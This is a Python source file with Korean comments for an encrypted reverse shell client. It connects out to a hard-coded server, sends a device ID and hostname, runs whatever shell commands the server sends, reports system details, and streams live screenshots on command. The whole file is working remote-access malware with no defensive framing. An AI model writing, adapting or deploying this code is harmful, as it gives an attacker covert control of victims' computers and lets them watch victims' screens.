import os
import socket
import subprocess
import base64
import time
import uuid
import platform
import cv2
import pickle
import numpy as np
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
try:
    import pyautogui
except:
    print("디스플레이 없음")

# 암호화 키와 IV (16바이트 고정)
KEY = b"your_16_byte_key"
IV = b"abcdefghijklmnop"

def encrypt(data):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return base64.b64encode(cipher.encrypt(pad(data, AES.block_size)))

def decrypt(data):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return unpad(cipher.decrypt(base64.b64decode(data)), AES.block_size)

def stream_screen():
    print("스트림 시작")
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    client_socket.connect((SERVER_IP, STREAM_PORT))

    try:
        while True:
            # 화면 캡처
            screenshot = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
            
            # 데이터 직렬화 및 전송
            data = pickle.dumps(frame)
            client_socket.sendall(len(data).to_bytes(4, 'big') + data)
    except Exception as e:
        print(f"오류 발생: {e}")
    finally:
        client_socket.close()

def reverse_shell(server_ip, server_port):
    device_id = str(uuid.uuid4())  # 고유 디바이스 ID 생성
    hostname = platform.node()  # 호스트 이름
    current_directory = os.getcwd()  # 초기 디렉토리 설정

    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print(f"[+] Connecting to {server_ip}:{server_port}...")
            client.connect((server_ip, server_port))
            print("[+] Connected to server.")

            # 디바이스 ID와 호스트 이름 전송
            client.send(encrypt(f"{device_id}:{hostname}".encode("utf-8")))

            while True:
                encrypted_command = client.recv(4096)
                command = decrypt(encrypted_command).decode("utf-8")

                if command.lower() == "exit":
                    break

                # `cd` 명령 처리
                if command.startswith("cd "):
                    path = command[3:].strip()
                    try:
                        os.chdir(path)
                        current_directory = os.getcwd()  # 현재 디렉토리 업데이트
                        result = f"Changed directory to {current_directory}\n"
                    except FileNotFoundError:
                        result = f"Directory not found: {path}\n"

                elif command.lower() == "sysinfo":
                    # 시스템 정보 반환
                    result = (
                        f"Hostname: {hostname}\n"
                        f"OS: {platform.system()} {platform.release()}\n"
                        f"Architecture: {platform.architecture()[0]}\n"
                        f"Processor: {platform.processor()}\n"
                        f"CPU Count: {os.cpu_count()}\n"
                    )

                elif command.lower() == "stream":
                    stream_screen()

                else:
                    # 현재 디렉토리에서 명령 실행
                    output = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=current_directory)
                    result = output.stdout + output.stderr
                

                # 결과와 현재 디렉토리를 함께 전송
                response = f"{current_directory}\n{result}"
                encrypted_result = encrypt(response.encode("utf-8"))
                client.send(encrypted_result)

        except Exception as e:
            print(f"[!] Error: {e}. Retrying in 5 seconds...")
            time.sleep(5)
        finally:
            try:
                client.close()
            except Exception:
                pass

if __name__ == "__main__":
    SERVER_IP = "192.168.0.3"  # 서버 IP
    SERVER_PORT = 1232           # 서버 포트
    STREAM_PORT = 5555
    reverse_shell(SERVER_IP, SERVER_PORT)
